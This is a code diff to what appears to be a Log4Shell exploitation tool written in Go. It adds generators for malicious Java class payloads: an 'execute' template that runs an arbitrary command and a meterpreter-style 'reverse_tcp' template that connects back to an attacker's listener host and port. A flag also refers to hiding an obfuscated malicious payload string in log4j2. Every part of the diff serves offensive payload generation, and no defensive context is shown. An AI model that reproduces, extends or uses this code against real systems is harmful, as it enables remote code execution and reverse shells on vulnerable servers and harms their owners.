@@ -22,6 +22,8 @@ var (
 	hide     bool
 	genClass string
 	genArgs  string
+	gnClass  string
+	genOut   string
 )
 
 func init() {
@@ -43,6 +45,8 @@ func init() {
 	flag.BoolVar(&hide, "hide", false, "hide obfuscated malicious(payload) string in log4j2")
 	flag.StringVar(&genClass, "gen", "", "generate Java class file with template name")
 	flag.StringVar(&genArgs, "args", "", "arguments about generate Java class file")
+	flag.StringVar(&gnClass, "class", "", "specify the new class name")
+	flag.StringVar(&genOut, "output", "", "generated Java class file output path")
 	flag.Parse()
 }
 
@@ -134,37 +138,79 @@ func obfuscate() {
 
 func generateClass() {
 	switch genClass {
-	case "exec":
-		template, err := os.ReadFile("template/Exec.class")
-		checkError(err)
-
-		args := flag.NewFlagSet("Execute", flag.ExitOnError)
-		args.SetOutput(os.Stdout)
-		var (
-			command string
-			class   string
-			output  string
-		)
-		args.StringVar(&command, "cmd", "", "the executed command")
-		args.StringVar(&class, "class", "Exec", "the new class name")
-		args.StringVar(&output, "output", "", "output class file path")
-		_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
-
-		if command == "" {
-			args.PrintDefaults()
-			return
-		}
-		if output == "" {
-			output = filepath.Join(config.PayloadDir, class+".class")
-		}
-		data, err := log4shell.GenerateExecuteClass(template, command, class)
-		checkError(err)
-		err = os.WriteFile(output, data, 0600)
-		checkError(err)
-		fmt.Println("Save generated class file to the path:", output)
+	case "execute":
+		generateExecute()
+	case "reverse_tcp":
+		generateReverseTCP()
+	case "":
+		fmt.Println("supported Java class template: execute, reverse_tcp")
+		return
 	default:
-		log.Fatalf("[error] unknown class template name: \"%s\"\n", genClass)
+		log.Fatalf("[error] unknown Java class template name: \"%s\"\n", genClass)
 	}
+	fmt.Println("Save generated Java class file to the path:", genOut)
+}
+
+func generateExecute() {
+	template, err := os.ReadFile("template/Execute.class")
+	checkError(err)
+
+	args := flag.NewFlagSet("Execute", flag.ExitOnError)
+	args.SetOutput(os.Stdout)
+	var command string
+	args.StringVar(&command, "cmd", "", "the executed command")
+	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
+
+	if command == "" {
+		args.PrintDefaults()
+		return
+	}
+	if gnClass == "" {
+		gnClass = "Execute"
+	}
+	if genOut == "" {
+		genOut = filepath.Join(config.PayloadDir, gnClass+".class")
+	}
+
+	data, err := log4shell.GenerateExecute(template, command, gnClass)
+	checkError(err)
+	err = os.WriteFile(genOut, data, 0600)
+	checkError(err)
+}
+
+func generateReverseTCP() {
+	template, err := os.ReadFile("template/ReverseTCP.class")
+	checkError(err)
+
+	args := flag.NewFlagSet("meterpreter/reverse_tcp", flag.ExitOnError)
+	args.SetOutput(os.Stdout)
+	var (
+		host string
+		port uint
+	)
+	args.StringVar(&host, "host", "", "listener host")
+	args.UintVar(&port, "port", 4444, "listener port")
+	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
+
+	if host == "" {
+		args.PrintDefaults()
+		return
+	}
+	if port > 65535 {
+		fmt.Println("[error]", "invalid port:", port)
+		return
+	}
+	if gnClass == "" {
+		gnClass = "ReverseTCP"
+	}
+	if genOut == "" {
+		genOut = filepath.Join(config.PayloadDir, gnClass+".class")
+	}
+
+	data, err := log4shell.GenerateReverseTCP(template, host, uint16(port), "", gnClass)
+	checkError(err)
+	err = os.WriteFile(genOut, data, 0600)
+	checkError(err)
 }
 
 func checkError(err error) {
